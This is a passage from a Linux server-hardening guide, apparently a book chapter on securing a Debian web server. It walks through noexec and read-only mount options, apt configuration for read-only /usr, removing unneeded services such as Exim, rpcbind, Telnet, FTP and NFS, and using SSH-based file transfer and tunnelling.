<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /usr ext4 defaults,nodev,ro <code class="m">0</code> <code class="m">2</code>
<code class="c1"># /var was on /dev/sda5 during installation</code>
<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /var ext4 defaults,nodev <code class="m">0</code> <code class="m">2</code>

<code class="c1"># 2016-08-29 Using GParted in Knopix, I reduced the size of /var (on sda5) by 300MB</code>
<code class="c1"># Ceated new partition (sda11) of 100MB for existing /var/tmp.</code>
<code class="c1"># Created new partition (sda12) of 200MB for existing /var/log.</code>
<code class="c1"># With the help of df -h, lsblk, and blkid, I created the following two mounts:</code>
<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /var/tmp ext4 rw,noexec,nosuid,nodev <code class="m">0</code> <code class="m">2</code>
<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /var/log ext4 rw,noexec,nosuid,nodev <code class="m">0</code> <code class="m">2</code>
<code class="c1"># Then did the same thing with /usr (on sda8)</code>
<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /usr/share ext4 nosuid,nodev,ro <code class="m">0</code> <code class="m">2</code>

<code class="c1"># Added tmpfs manually.</code>
tmpfs /dev/shm tmpfs defaults,nodev,nosuid,noexec <code class="m">0</code> <code class="m">0</code>

<code class="c1"># swap was on /dev/sda10 during installation</code>
<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; none swap sw <code class="m">0</code> <code class="m">0</code>
/dev/sr0 /media/cdrom0 udf,iso9660 user,noauto <code class="m">0</code> <code class="m">0</code>
/dev/fd0 /media/floppy0 auto rw,user,noauto <code class="m">0</code> <code class="m">0</code>
</pre></div>

</figure>

<p>If you added any of these mounts on the machine while it was running, you could use the following command to mount them all.</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo mount -a
</pre></div>

</figure>

<p>Once you have booted into your machine again, you can perform some tests. </p>

<figure class="code">
<div class="highlight"><pre><code></code>mount
<code class="c1"># Relevant output lines:</code>
tmpfs on /dev/shm <code class="nb">type</code> tmpfs <code class="o">(</code>rw,nosuid,nodev,noexec<code class="o">)</code>
/dev/sda11 on /var/tmp <code class="nb">type</code> ext4 <code class="o">(</code>rw,nosuid,nodev,noexec,relatime,data<code class="o">=</code>ordered<code class="o">)</code>
/dev/sda12 on /var/log <code class="nb">type</code> ext4 <code class="o">(</code>rw,nosuid,nodev,noexec,relatime,data<code class="o">=</code>ordered<code class="o">)</code>
/dev/sda13 on /usr/share <code class="nb">type</code> ext4 <code class="o">(</code>ro,nosuid,nodev,relatime,data<code class="o">=</code>ordered<code class="o">)</code>
</pre></div>

</figure>

<p>Test your <code>noexec</code> by putting the following script in <code>/var</code>, and changing the permissions on it:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># Make sure execute bits are on.</code>
sudo chmod <code class="m">755</code> /var/kimsTest
</pre></div>

</figure>

<p>Copying it to <code>/var/tmp</code>, and <code>/var/log</code>, Then try running each of them. You should only be able to run the one that is in the directory mounted without the <code>noexec</code> option. My file kimsTest looks like this:</p>

<figure class="code">
  <figcaption>kimsTest</figcaption>

<div class="highlight"><pre><code></code><code class="ch">#!/bin/sh</code>
<code class="nb">echo</code> <code class="s2">"Testing testing testing kim"</code>
</pre></div>

</figure>

<p>Try running them:</p>

<figure class="code">
<div class="highlight"><pre><code></code>you@your_server:/var$ ./kimsTest
Testing testing testing kim
you@your_server:/var$ ./tmp/kimsTest
-bash: ./tmp/kimsTest: Permission denied
you@your_server:/var$ ./log/kimsTest
-bash: ./tmp/kimsTest: Permission denied
</pre></div>

</figure>

<p>If you set <code>/tmp</code> with <code>noexec</code> and / or <code>/usr</code> with read-only (<code>ro</code>), then you will also need to modify or create if it does not exist, the file <code>/etc/apt/apt.conf</code> and also the referenced directory that apt will write to. The file could look something like the following:</p>

<figure class="code">
  <figcaption>/etc/apt/apt.conf</figcaption>

<div class="highlight"><pre><code></code><code class="c1"># IP is the address of your apt-cacher server</code>
<code class="c1"># Port is the port that your apt-cacher is listening on, usually 3142</code>
Acquire::http::Proxy http://<code class="o">[</code>IP<code class="o">]</code>:<code class="o">[</code>Port<code class="o">]</code><code class="p">;</code>

<code class="c1"># http://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s4.10.1</code>
<code class="c1"># Set an alternative temp directory to /tmp if /tmp in /etc/fstab is noexec,</code>
<code class="c1"># and make sure the directory exists.</code>
<code class="c1"># See following link for An alternative technique:</code>
<code class="c1"># https://debian-administration.org/article/57/Making_/tmp_non-executable</code>
APT::ExtractTemplates::TempDir <code class="s2">"/etc/apt/packagefiles"</code><code class="p">;</code>

<code class="c1"># If /usr in /etc/fstab is set to read-only (ro),</code>
<code class="c1"># you will have to first set /usr to read-write (rw) in order to</code>
<code class="c1"># install new packages, then remount according to /etc/fstab.</code>
<code class="c1"># Another example here: https://frouin.me/2015/03/16/tmp-no-exec/</code>
DPkg
<code class="o">{</code>
   Pre-Invoke
   <code class="o">{</code>  
      <code class="s2">"mount -o remount,rw /usr"</code><code class="p">;</code>
      <code class="s2">"mount -o remount,rw /usr/share"</code><code class="p">;</code>
   <code class="o">}</code><code class="p">;</code>
   Post-Invoke
   <code class="o">{</code>
      <code class="s2">"mount -o remount /usr"</code><code class="p">;</code>
      <code class="s2">"mount -o remount /usr/share"</code><code class="p">;</code>
   <code class="o">}</code><code class="p">;</code>
<code class="o">}</code><code class="p">;</code>
</pre></div>

</figure>

<p>You can spend quite a bit of time experimenting with your mounts and testing. It is well worth locking these down as tightly as you can, make sure you test properly before you reboot, unless you are happy modifying things further via a live CD. This set-up will almost certainly not be perfect for you, there are many options you can apply, some may work for you, some may not. Be prepared to keep adjusting these as time goes on, you will probably find that something can not execute where it is supposed to, or some other option you have applied is causing some trouble. In which case you may have to relax some options, or consider tightening them up more. Good security is always an iterative approach. You can not know today, what you are about to learn tomorrow. </p>

<p>You can also look at enabling a <a href="https://wiki.debian.org/ReadonlyRoot#Enable_readonly_root">read-only <code>/</code> mount</a></p>

<p>Also consider the pros and cons of <a href="http://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html">increasing</a> your shared memory (via <code>/run/shm</code>) vs not increasing it.</p>

<p>Check out the <a href="chap07.html#additional-resources-vps-locking-down-the-mounting-of-partitions">Additional Resources</a> chapter for extra resources in working with your mounts.</p>

<h5 id="vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper">Portmap</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionVERYEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<figure class="code">
<div class="highlight"><pre><code></code>dpkg-query -l <code class="s1">'*portmap*'</code>
dpkg-query: no packages found matching *portmap*
</pre></div>

</figure>

<p>If port mapper is not installed (default on debian web server), we do not need to remove it. Recent versions of Debian will use the <code>portmap</code> replacement of <code>rpcbind</code> instead. If you find port mapper is installed, you do not need it on a web server, and if you are hardening a file server, you may require <code>rpcbind</code>. For example there are two packages required if you want to support NFS on your server: nfs-kernel-server and nfs-common, the latter has a <a href="https://packages.debian.org/stretch/nfs-common">dependency on <code>rpcbind</code></a>.</p>

<p>The <code>portmap</code> service (version 2 of the port mapper protocol) would <a href="http://www.linux-nis.org/nis-howto/HOWTO/portmapper.html">convert</a> RPC program numbers into TCP/IP (or UDP/IP) protocol port numbers. When an RPC server (such as NFS prior to v4) was started, it would instruct the port mapper which port number it was listening on, and which RPC program numbers it is prepared to serve. When clients wanted to make an RPC call to a given program number, the client would first contact the <code>portmap</code> service on the server to enquire of which port number its RPC packets should be sent. <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind"><code>Rpcbind</code></a> which uses version 3 and 4 of the port mapper protocol (called the rpcbind protocol) does things a little differently.</p>

<p>You can also stop <code>portmap</code> responses by modifying the two below hosts files like so: </p>

<figure class="code">
  <figcaption>/etc/hosts.allow</figcaption>

<div class="highlight"><pre><code></code><code class="c1"># All : ALL</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>/etc/hosts.deny</figcaption>

<div class="highlight"><pre><code></code>portmap : ALL
</pre></div>

</figure>

<p>but ideally, if you do need the port mapper running, consider upgrading to <code>rpcbind</code> for starters, then check the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind"><code>rpcbind</code> section</a> below for countermeasures, </p>

<p>The above changes to the two hosts files would be effective immediately. A restart of the port mapper is not required in this case.</p>

<p>There are further details around the <code>/etc/hosts.[deny &amp; allow]</code> in the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs">NFS section</a></p>

<h5 id="vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim">Disable, Remove Exim</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<figure class="code">
<div class="highlight"><pre><code></code>dpkg-query -l <code class="s1">'*exim*'</code>
</pre></div>

</figure>

<p>This will probably show that Exim4 is currently installed.</p>

<p>If so, before exim4 is disabled, a <code>netstat -tlpn</code> will produce output similar to the following:</p>


<figure class="image center" style="width: 396px;">
  <img src="images/NetstatBeforeEximDisabled.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Which shows that exim4 is listening on localhost and it is not publicly accessible. Nmap confirms this, but we do not need it, so lets disable it. You could also use the more modern ss program too. You may also notice <code>monit</code> and <code>nodejs</code> listening in these results. Both <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit"><code>monit</code></a> and our <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive"><code>nodejs</code></a> application is set-up under the Proactive Monitoring section later in this chapter.</p>

<p>When a <a href="https://www.debian-administration.org/article/212/An_introduction_to_run-levels">run level</a> is entered, <code>init</code> executes the target files that start with <code>K</code>, with a single argument of stop, followed with the files that start with <code>S</code> with a single argument of start. So by renaming <code>/etc/rc2.d/S15exim4</code> to <code>/etc/rc2.d/K15exim4</code> you are causing <code>init</code> to run the service with the stop argument when it moves to run level 2. Just out of interest sake, the scripts at the end of the links with the lower numbers are executed before scripts at the end of links with the higher two digit numbers. Now go ahead and check the directories for run levels 3-5 as well, and do the same. You will notice that all the links in <code>/etc/rc0.d/</code> (which are the links executed on system halt) start with <code>K</code>. Is it making sense?</p>

<p>Follow up with another <code>sudo netstat -tlpn</code>:</p>


<figure class="image center" style="width: 396px;">
  <img src="images/NetstatAfterEximDisabled.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>And that is all we should see. If you dont have monit or node running, you wont see them either of course.</p>

<p>Later on I started receiving errors from <code>apt-get update &amp;&amp; upgrade</code>:</p>

<figure class="code">
<div class="highlight"><pre><code></code>Setting up exim4-config <code class="o">(</code><code class="m">4</code>.86.2-1<code class="o">)</code> ...
<code class="m">2016</code>-03-13 <code class="m">12</code>:15:50 Exim configuration error in line <code class="m">186</code> of /var/lib/exim4/config.autogenerat<code class="se">\</code>
ed.tmp:
main option <code class="s2">"add_environment"</code> unknown
Invalid new configfile /var/lib/exim4/config.autogenerated.tmp, not installing 
/var/lib/exim4/config.autogenerated.tmp to /var/lib/exim4/config.autogenerated
dpkg: error processing package exim4-config <code class="o">(</code>--configure<code class="o">)</code>:
subprocess installed post-installation script returned error <code class="nb">exit</code> status <code class="m">1</code>
Errors were encountered <code class="k">while</code> processing: exim4-config
</pre></div>

</figure>

<p>Removing the following packages will solve that:</p>

<figure class="code">
<div class="highlight"><pre><code></code>apt-get --purge remove exim4 exim4-base exim4-config exim4-daemon-light
<code class="c1"># Get rid of the logs if you like.</code>
rm -r /var/log/exim4/
</pre></div>

</figure>

<h5 id="leanpub-auto-remove-nis">Remove NIS</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>If Network Information Service (NIS) or the replacement NIS+ is installed, ideally you will want to remove it. If you needed centralised authentication for multiple machines, you could set-up an LDAP server and configure PAM on your machines in order to contact the LDAP server for user authentication. If you are in the cloud, you could look at using the platforms directly service, such as <a href="https://aws.amazon.com/directoryservice/">AWS Directory Service</a>. We may have no need for distributed authentication on our web server at this stage.</p>

<p>Check to see if NIS is installed by running the following command:</p>

<figure class="code">
<div class="highlight"><pre><code></code>dpkg-query -l <code class="s1">'*nis*'</code>
</pre></div>

</figure>

<p>Nis is not installed by default on a Debian web server, so in this case, we do not need to remove it.</p>

<p>If the host you were hardening had the role of a file server and was running NFS, and you need directory services, then you may need something like Kerberos and/or LDAP. There is plenty of documentation and tutorials on Kerberos and LDAP and replacing NIS with them.</p>

<h5 id="vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind">Rpcbind</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>One of the <a href="https://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.halx001/portmap.htm">differences</a> between the now deprecated <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper"><code>portmap</code></a> service and <code>rpcbind</code> is that <code>portmap</code> returns port numbers of the server programs and rpcbind returns universal addresses. This contact detail is then used by the RPC client to know where to send its packets. In the case of a web server we have no need for this.</p>

<p>Spin up Nmap:</p>

<figure class="code">
<div class="highlight"><pre><code></code>nmap -p <code class="m">0</code>-65535 &lt;your_server&gt;
</pre></div>

</figure>


<figure class="image center" style="width: 396px;">
  <img src="images/RemoveRpcBind.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Because I was using a non default port for SSH, nmap does not announce it correctly, although as shown in the Process and Practises chapter in the Penetration Testing section of Fascicle 0, using service fingerprinting techniques, it is usually easy to find out what is bound to the port. Tools like <a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-unhide">Unhide</a> will also show you hidden processes bound to hidden ports.</p>

<p>To obtain a list of currently running servers (determined by <code>LISTEN</code>) on our web server.</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo netstat -tap <code class="p">|</code> grep LISTEN
</pre></div>

</figure>

<p>or</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo netstat -tlpn
</pre></div>

</figure>

<p>As per the previous netstat outputs, we see that <code>sunrpc</code> is listening on a port and was started by <code>rpcbind</code> with the PID of <code>1498</code>. Now Sun Remote Procedure Call is running on port <code>111</code> (The same port that <code>portmap</code> used to listen on). Netstat can tell you the port, but we have confirmed it with the nmap scan above. Rpcbind is used by NFS (as mentioned above, <code>rpcbind</code> is a dependency of nfs-common) and as we do not need or want our web server to be a NFS file server, we can get rid of the <code>rpcbind</code> package. If for what ever reason you do actually need the port mapper, then make sure you lock down which hosts/networks it will respond to by modifying the <code>/etc/hosts.deny</code> and <code>/etc/hosts.allow</code> as seen in the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs">NFS section</a>.</p>

<figure class="code">
<div class="highlight"><pre><code></code>dpkg-query -l <code class="s1">'*rpc*'</code>
</pre></div>

</figure>

<p>Shows us that <code>rpcbind</code> is installed and gives us other details. Now if you have been following along with me and have made the <code>/usr</code> mount read only, some stuff will be left behind when we try to purge:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo apt-get purge rpcbind
</pre></div>

</figure>

<p>Following are the outputs of interest. Now if you have your mounts set-up correctly, you will not see the following errors, if how ever you do see them, then you will need to spend some more time modifying your <code>/etc/fstab</code> as discussed above:</p>

<figure class="code">
<div class="highlight"><pre><code></code>The following packages will be REMOVED:
nfs-common* rpcbind*
<code class="m">0</code> upgraded, <code class="m">0</code> newly installed, <code class="m">2</code> to remove and <code class="m">0</code> not upgraded.
Do you want to <code class="k">continue</code> <code class="o">[</code>Y/n<code class="o">]</code>? y
Removing nfs-common ...
<code class="o">[</code> ok <code class="o">]</code> Stopping NFS common utilities: idmapd statd.
dpkg: error processing nfs-common <code class="o">(</code>--purge<code class="o">)</code>:
cannot remove <code class="sb">`</code>/usr/share/man/man8/rpc.idmapd.8.gz<code class="s1">': Read-only file system</code>
<code class="s1">Removing rpcbind ...</code>
<code class="s1">[ ok ] Stopping rpcbind daemon....</code>
<code class="s1">dpkg: error processing rpcbind (--purge):</code>
<code class="s1">cannot remove `/usr/share/doc/rpcbind/changelog.gz'</code>: Read-only file system
Errors were encountered <code class="k">while</code> processing:
nfs-common
rpcbind
E: Sub-process /usr/bin/dpkg returned an error code <code class="o">(</code><code class="m">1</code><code class="o">)</code>
</pre></div>

</figure>

<p>If you received the above errors, ran the following command again:</p>

<figure class="code">
<div class="highlight"><pre><code></code>dpkg-query -l <code class="s1">'*rpc*'</code>
</pre></div>

</figure>

<p>Which would yield a result of <code>pH</code>, that is a desired action of (p)urge and a package status of (H)alf-installed, and want to continue the removal of <code>rpcbind</code>, try the <code>purge</code>, <code>dpkg-query</code> and <code>netstat</code> command again to make sure <code>rpcbind</code> is gone and of course no longer listening.</p>

<p>Also you can remove unused dependencies now, after you get the following message:</p>

<figure class="code">
<div class="highlight"><pre><code></code>The following packages were automatically installed and are no longer required:
libevent-2.0-5 libgssglue1 libnfsidmap2 libtirpc1
Use <code class="s1">'apt-get autoremove'</code> to remove them.
The following packages will be REMOVED:
rpcbind*
</pre></div>

</figure>

<figure class="code">
<div class="highlight"><pre><code></code>sudo apt-get -s autoremove
</pre></div>

</figure>

<p>Because I want to simulate what is going to be removed because I am paranoid and have made stupid mistakes with autoremove years ago, and that pain has stuck with me ever since. I auto-removed a meta-package which depended on many other packages. A subsequent autoremove for packages that had a sole dependency on the meta-package meant they would be removed. Yes it was a painful experience. <code>/var/log/apt/history.log</code> has your recent apt history. I used this to piece back together my system.</p>

<p>Then follow up with the real thing Just remove the <code>-s</code> and run it again. Just remember, the less packages your system has the less code there is for an attacker to exploit.</p>

<p>The port mapper should never be visible from a hostile network, especially the internet. The same goes for all RPC servers due to reflected and often amplified DoS attacks.</p>

<p>You can also stop <code>rpcbind</code> responses by modifying the two below hosts files like so: </p>

<figure class="code">
  <figcaption>/etc/hosts.allow</figcaption>

<div class="highlight"><pre><code></code><code class="c1"># All : ALL</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>/etc/hosts.deny</figcaption>

<div class="highlight"><pre><code></code>rpcbind : ALL
</pre></div>

</figure>

<p>The above changes to the two hosts files would be effective immediately. A restart of the port mapper would not be required in this case.</p>

<p>There are further details around the <code>/etc/hosts.[deny &amp; allow]</code> files in the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs">NFS section</a> that will help you fine tune which hosts and networks should be permitted to query and receive response from the port mapper. Be sure to check them out if you are going to retain the port mapper, so you do not become a victim of a reflected amplified DoS attack, and that you keep any RPC servers that you may need exposed to your internal clients. You can test this by running the same command that we did in the <a href="chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-portmap-rpcinfo-t">Identify Risks</a> section.</p>

<figure class="code">
  <figcaption>rpcinfo</figcaption>

<div class="highlight"><pre><code></code>rpcinfo -T udp &lt;target host&gt; 
</pre></div>

</figure>

<p>This time, with the two hosts files set-up as above, the results should look like the following:</p>

<figure class="code">
  <figcaption>rpcinfo results</figcaption>

<div class="highlight"><pre><code></code>No remote programs registered.
</pre></div>

</figure>

<p>You will notice in the response as recorded by Wireshark, that the length is now smaller than the request:</p>

<figure class="code">
  <figcaption>wireshark results</figcaption>

<div class="highlight"><pre><code></code>Source      Destination Protocol Length Info
&lt;<code class="nb">source</code> IP&gt; &lt;dest IP&gt;   Portmap  <code class="m">82</code>     V3 DUMP Call <code class="o">(</code>Reply In <code class="m">76</code><code class="o">)</code>
&lt;dest IP&gt;   &lt;<code class="nb">source</code> IP&gt; Portmap  <code class="m">70</code>     V3 DUMP Reply <code class="o">(</code>Call In <code class="m">75</code><code class="o">)</code>
</pre></div>

</figure>

<h5 id="vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet">Remove Telnet</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Do not use Telnet for your own systems, SSH provides encrypted shell access and was designed to replace Telnet. Use it instead, there are also many ways you can <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-hardening-ssh">harden SSH</a>.</p>

<figure class="code">
<div class="highlight"><pre><code></code>dpkg-query -l <code class="s1">'*telnet*'</code>
</pre></div>

</figure>

<p>Telnet installed?</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo apt-get remove telnet
</pre></div>

</figure>

<p>Telnet gone?</p>

<figure class="code">
<div class="highlight"><pre><code></code>dpkg-query -l <code class="s1">'*telnet*'</code>
</pre></div>

</figure>

<h5 id="vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp">Remove FTP</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>I do not believe there is any place to use FTP, even on a network that you think is safe. The first problem here, if you are still thinking like this, is that the network you think may be safe is a perfect place for someone to exploit, this stems from the Fortress Mentality, as discussed in the Physical and Network chapters.</p>

<figure class="code">
<div class="highlight"><pre><code></code>dpkg-query -l <code class="s1">'*ftp*'</code>
</pre></div>

</figure>

<p>Ftp installed?</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo apt-get remove ftp
</pre></div>

</figure>

<p>Ftp gone?</p>

<figure class="code">
<div class="highlight"><pre><code></code>dpkg-query -l <code class="s1">'*ftp*'</code>
</pre></div>

</figure>

<p>Let us take a look at FTPS, SFTP and SCP</p>

<p>
  <strong>FTPS is FTP over TLS with some issues</strong>
</p>

<p>There were two separate methods to invoke FTPS client security, defined by which port they initiate communications with:</p>

<ol class="numeric">
  <li>Implicit <br />
The client is expected to immediately challenge the FTPS server with a TLS <code>ClientHello</code> message before any other FTP commands are sent by the client. If the FTPS server does not receive the initial TLS <code>ClientHello</code> message first, the server should drop the connection.  
    <p>Implicit also requires that all communications of the FTP session be encrypted.  </p>

    <p>In order to maintain compatibility with existing FTP clients, implicit FTPS was expected to also listen on the command / control channel using port 990/TCP, and the data channel using port 989/TCP. This left port 21/TCP for legacy no encryption communication. Using port 990 implicitly implied encryption was mandatory.  </p>

    <p>This is the earlier and mostly considered deprecated method.  </p>
  </li>
  <li>Explicit<br />
The client starts a conversation with the FTPS server on port 21/TCP and can then request to upgrade to using a mutually agreed encryption method. The FTPS server can also decide to allow the client to continue an unencrypted conversation or not. The client has to actually ask for the security upgrade.  
    <p>This method also allows the FTPS client to decide whether they want to encrypt nothing, encrypt just the command channel (which the credentials are sent over), or encrypt everything.</p>
  </li>
</ol>

<p>So as you can see, it is quite conceivable that a user may become confused as to whether encryption is on, is not on, which channel it is applied to and not applied to. The user has to understand the differences between the two methods of invoking security, not invoking it at all, or only on one of the channels.</p>

<p>One thing that you really do not want when it comes to privacy, is confusion. When it comes to SFTP or any protocol over SSH, everything is encrypted, simple as that.</p>

<p>Similar to a web server serving HTTPS with a public key certificate, an FTPS server will also respond with its public key certificate (keeping its private key private). The public key certificate it responds with needs to be generated from a Certificate Authority (CA), whether it is one the server administrator has created (self signed) or a public trusted CA (often paid for), the CA (root) certificate must be copied and/or reside locally to the FTPS client. The checksum of the CA (root) certificate will need to be verified also.</p>

<p>If the FTPS client does not already have the CA (root) certificate when the user initiates a connection, the FTPS client should generate a warning due to the fact that the CA (root) certificate is not yet trusted.</p>

<p>This process is quite complicated and convoluted as opposed to how FTP over SSH works.</p>

<p id="vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-sftp">
  <strong>SFTP is FTP over SSH</strong>
</p>

<p>As I have already detailed in the section <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure">SSH Connection Procedure</a>, the SSH channel is first set-up, thus the client is already authenticated, and their identity is available to the FTP protocol or any protocol wishing to use the encrypted channel. The public key is securely copied from the client to the server out-of-band. If the configuration of SSH is carried out correctly and hardened as I detailed throughout the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh">SSH</a> countermeasures section, the SFTP and any protocol for that matter over SSH has the potential for greater security than those using the Trusted Third Party (TTP) model, which X.509 certificates (utilised in FTPS, HTTPS, OpenVPN, not the <a href="http://louwrentius.com/why-you-should-not-use-ipsec-for-vpn-connectivity.html">less secure IPSec</a>) rely on.</p>

<p>Why is SSH capable of a higher level of security?</p>

<p>With SSH, you copy the public key that you created on your client using <code>ssh-copy-id</code> to the server. There are no other parties involved. Even if the public key gets compromised, unless the attacker has the private key, which never leaves the client, they can not be authenticated to the server and they can not MItM your SSH session, as that would issue a warning due to the key fingerprint of the MItM no longer matching that in your <code>known_hosts</code> file. Even if an attacker managed to get near your private key, SSH will not run if the permissions of the <code>~/.ssh/</code> directory and files within are to permissive, so the user knows immediately anyway. Even then, if somehow the private key was compromised, the attacker still needs the pass-phrase. SSH is a perfect example of defence in depth.</p>

<p>with X.509 certificates, you rely (trust) on the third party (the CA). When the third party is compromised (as this happens frequently), many things can go wrong, some of which are discussed in the <a href="chap04.html#network-countermeasures-tls-downgrade-x509-cert-revocation-evolution">X.509 Certificate Revocation Evolution</a> section of the Network chapter. The compromised CA can start issuing certificates to malicious entities. All that may be necessary at this point is for your attacker to <a href="chap04.html#network-identify-risks-spoofing-arp">poison your ARP cache</a> if you are relying on IP addresses, or do the same plus poison your DNS. This attack is detailed under the <a href="chap04.html#network-identify-risks-spoofing-website">Spoofing Website</a> section in the Network chapter, was demoed at WDCNZ 2015, and also links to a video.</p>

<p>The CA root certificate must be removed from all clients and you will need to go through the process of creating / obtaining a new certificate with a (hopefully) non compromised CA. With SSH, you only have to trust yourself, and I have detailed what you need to know to make good decisions in the SSH section.</p>

<p>SSH not only offers excellent security, but is also extremely versatile.</p>

<p id="vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-scp"><a href="https://blog.binarymist.net/2012/03/25/copying-with-scp/"><strong>SCP</strong></a> or Secure Copy leverages the security of SSH, and provides simple copy to and from, so once you have SSH set-up and hardened, you are in good stead to be pulling and pushing files around your networks securely with SSH. The SFTP protocol provides remote file system like capabilities, such as remote file deletion, directory listings, resuming of interrupted transfers. If you do not require the additional features of (S)FTP, SCP may be a good option for you. Like SSH, SCP does not have native platform support on Windows, although Windows support is available, and easy enough to set-up, as I <a href="https://blog.binarymist.net/2011/12/27/openssh-from-linux-to-windows-7-via-tunneled-rdp/">have done many times</a>.</p>

<p>Any features that you may think missing by using SCP rather than SFTP are more than made up for simply by using SSH which in itself provides a complete remote Secure SHell and is very flexible as to how you can use it.</p>

<p>Another example is using <a href="https://blog.binarymist.net/2011/03/06/rsync-over-ssh-from-linux-workstation-to-freenas/"><strong>Rsync over SSH</strong></a>, which is an excellent way to sync files between machines. Rsync will only copy the files that have been changed since the last sync, so this can be extremely quick</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># -a, --archive  is archive mode which actually includes -rlptgoD (no -H,-A,-X)</code>
rsync -vva --delete --force -e <code class="s1">'ssh -p &lt;non default port&gt;'</code> &lt;<code class="nb">source</code> dir&gt; &lt;myuser&gt;@&lt;myserver&gt;:&lt;<code class="se">\</code>
dest dir&gt;
</pre></div>

</figure>

<p>For Windows machines, I also run all of my <strong>RDP sessions over SSH</strong>, see my blog post for further details: <a href="https://blog.binarymist.net/2010/08/26/installation-of-ssh-on-64bit-windows-7-to-tunnel-rdp/">https://blog.binarymist.net/2010/08/26/installation-of-ssh-on-64bit-windows-7-to-tunnel-rdp/</a></p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># 3391 is any spare port on localhost.</code>
<code class="c1"># 3389 is the port that RDP listens on at MyWindowsBox</code>
ssh -v -f -L <code class="m">3391</code>:localhost:3389 -N MyUserName@MyWindowsBox
<code class="c1"># Once the SSH channel is up, Your local RDP client just needs to talk to localhost:3391    </code>
</pre></div>

</figure>

<p>So there is no reason to not have all of your inter-machine communications encrypted, whether they be on the internet, or on what you think is a trusted LAN. This is why firewalls are just another layer of defence and <a href="chap03.html#vps-identify-risks-lack-of-firewall">nothing more</a>.</p>

<h5 id="vps-countermeasures-disable-remove-services-harden-what-is-left-nfs">NFS</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>You should not need NFS running on a web server. The packages required for the NFS server to be running are nfs-kernel-server, which has a dependency on nfs-common (common to server and clients), which also has a dependency of rpcbind.</p>

<p>NFSv4 (December 2000) no longer requires the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper">portmap</a> service. Rpcbind is the replacement.</p>

<p>Issue the following command to confirm that the NFS server is not installed:</p>

<figure class="code">
<div class="highlight"><pre><code></code>dpkg-query -l <code class="s1">'*nfs*'</code>
</pre></div>

</figure>

<p>This may show you that you have nfs-common installed, but ideally you do not want nfs-kernel-server installed. If it is you can just:</p>

<figure class="code">
<div class="highlight"><pre><code></code>apt-get remove nfs-kernel-server
</pre></div>

</figure>

<p>If you do need NFS running for a file server, the usual files that will need some configuration will be the following:</p>

<ul>
  <li>
<code>/etc/exports</code> (Only file required to actually export your shares)</li>
  <li><code>/etc/hosts.allow</code></li>
  <li><code>/etc/hosts.deny</code></li>
</ul>

<p>Check that these files permissions are <code>644</code>, owned by <code>root</code>, with group of <code>root</code> or <code>sys</code>.</p>

